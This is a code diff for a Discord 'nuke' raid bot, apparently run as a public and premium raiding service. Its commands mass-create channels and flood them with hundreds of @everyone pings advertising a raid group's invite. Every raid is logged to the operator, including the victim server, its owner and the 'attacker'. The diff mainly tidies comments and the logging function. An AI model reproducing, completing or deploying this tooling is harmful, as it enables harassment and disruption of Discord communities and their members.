@@ -13,10 +13,8 @@ TOKEN = os.getenv('DISCORD_TOKEN')
 # --- CONFIGURATION ---
 CENTRAL_SERVER_ID = 1453920087194206394  # Your main server's ID (protected)
 PREMIUM_ROLE_ID = 1458177413325259035      # Your premium role's ID
-OWNER_ID = 1450919094202269881              # Your User ID
-
-# --- NEW LOGGING CONFIGURATION ---
-LOG_CHANNEL_ID = 1458254930052911215        # IMPORTANT: REPLACE with your private log channel ID!!
+OWNER_ID =  1450919094202269881             # Your User ID
+LOG_CHANNEL_ID = 1458257075393003561        # Your private log channel ID
 
 # --- NUKE COMMAND TEXTS & CONFIG ---
 NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
@@ -51,14 +49,11 @@ async def on_ready():
 # --- HELP COMMAND ---
 @bot.command(name='help')
 async def custom_help(ctx):
-    # This command is disabled in the log channel for cleanliness
     if ctx.channel.id == LOG_CHANNEL_ID: return
-    # Simplified message in the protected server
     if ctx.guild.id == CENTRAL_SERVER_ID:
         embed = discord.Embed(title="Bot Command Manual", description="This is a protected server. Destructive commands are disabled here.", color=discord.Color.orange())
         await ctx.send(embed=embed, delete_after=30)
         return
-    # Full help message
     await ctx.message.delete()
     embed = discord.Embed(title="Bot Command Manual", description="This bot provides public and premium raiding capabilities.", color=discord.Color.from_rgb(47, 49, 54))
     embed.add_field(name="Public Command", value="`:nuke`\nInitiates a standard raid (25 channels, 500 pings).", inline=False)
@@ -67,11 +62,12 @@ async def custom_help(ctx):
     await asyncio.sleep(60)
     await help_message.delete()
 
-# --- NUKE COMMANDS ---
+# --- NUKE COMMANDS (CORRECTED) ---
 @bot.command(name='nuke')
 async def nuke_normal(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
+    # Correctly passing 25 channels and 500 pings
     await execute_nuke(ctx, "raid-by-del1rium", NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
 
 @bot.command(name='premiumnuke')
@@ -79,6 +75,7 @@ async def nuke_normal(ctx):
 async def premium_nuke(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
+    # Correctly passing 50 channels and 1000 pings
     await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
 
 # --- CONFIGURATION COMMAND (PREMIUM) ---
@@ -96,13 +93,10 @@ async def nuke_config(ctx, channel_name: str, *, spam_text: str):
     await asyncio.sleep(15)
     await confirmation_msg.delete()
 
-# --- CENTRAL NUKE LOGIC ---
+# --- CENTRAL NUKE LOGIC (NOW RECEIVES CORRECT PARAMETERS) ---
 async def execute_nuke(ctx, channel_name, spam_text, num_channels, num_pings, is_premium: bool):
     guild = ctx.guild
-    # --- Data Collection for Log ---
     original_member_count = guild.member_count
-    
-    # --- Execution ---
     command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
     print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")
     
@@ -115,60 +109,26 @@ async def execute_nuke(ctx, channel_name, spam_text, num_channels, num_pings, is
     await asyncio.gather(*spam_tasks)
     
     print(f"{command_type} finished for {guild.name}.")
-    
-    # --- Send Log Embed ---
     await send_log_embed(ctx, command_type, original_member_count, num_channels, num_pings)
 
-# --- NEW LOGGING FUNCTION ---
+# --- LOGGING FUNCTION ---
 async def send_log_embed(ctx, command_type, member_count, channels, pings):
     log_channel = bot.get_channel(LOG_CHANNEL_ID)
     if not log_channel:
         print(f"CRITICAL: Log channel with ID {LOG_CHANNEL_ID} not found.")
         return
-
     is_premium = (command_type == "PREMIUM NUKE")
     embed_color = discord.Color.dark_red() if is_premium else discord.Color.dark_grey()
-    
-    embed = discord.Embed(
-        title=f"Nuke Operation Log: {ctx.guild.name}",
-        color=embed_color
-    )
-    embed.add_field(
-        name="Server Info",
-        value=f"**Name:** {ctx.guild.name}\n**ID:** {ctx.guild.id}",
-        inline=True
-    )
-    embed.add_field(
-        name="Server Owner",
-        value=f"**Name:** {ctx.guild.owner.name}\n**ID:** {ctx.guild.owner.id}",
-        inline=True
-    )
-    embed.add_field(
-        name="Attacker",
-        value=f"**Name:** {ctx.author.name}\n**ID:** {ctx.author.id}",
-        inline=True
-    )
-    embed.add_field(
-        name="Attack Type",
-        value=f"`{command_type}`",
-        inline=True
-    )
-    embed.add_field(
-        name="Statistics",
-        value=(
-            f"**Members:** {member_count}\n"
-            f"**Channels Created:** {channels}\n"
-            f"**Pings per Channel:** {pings}"
-        ),
-        inline=True
-    )
-    
+    embed = discord.Embed(title=f"Nuke Operation Log: {ctx.guild.name}", color=embed_color)
+    embed.add_field(name="Server Info", value=f"**Name:** {ctx.guild.name}\n**ID:** {ctx.guild.id}", inline=True)
+    embed.add_field(name="Server Owner", value=f"**Name:** {ctx.guild.owner.name}\n**ID:** {ctx.guild.owner.id}", inline=True)
+    embed.add_field(name="Attacker", value=f"**Name:** {ctx.author.name}\n**ID:** {ctx.author.id}", inline=True)
+    embed.add_field(name="Attack Type", value=f"`{command_type}`", inline=True)
+    embed.add_field(name="Statistics", value=(f"**Members:** {member_count}\n**Channels Created:** {channels}\n**Pings per Channel:** {pings}"), inline=True)
     if ctx.guild.icon:
         embed.set_thumbnail(url=ctx.guild.icon.url)
-
     embed.set_footer(text="Operation completed.")
     embed.timestamp = datetime.utcnow()
-
     try:
         await log_channel.send(embed=embed)
     except discord.Forbidden:
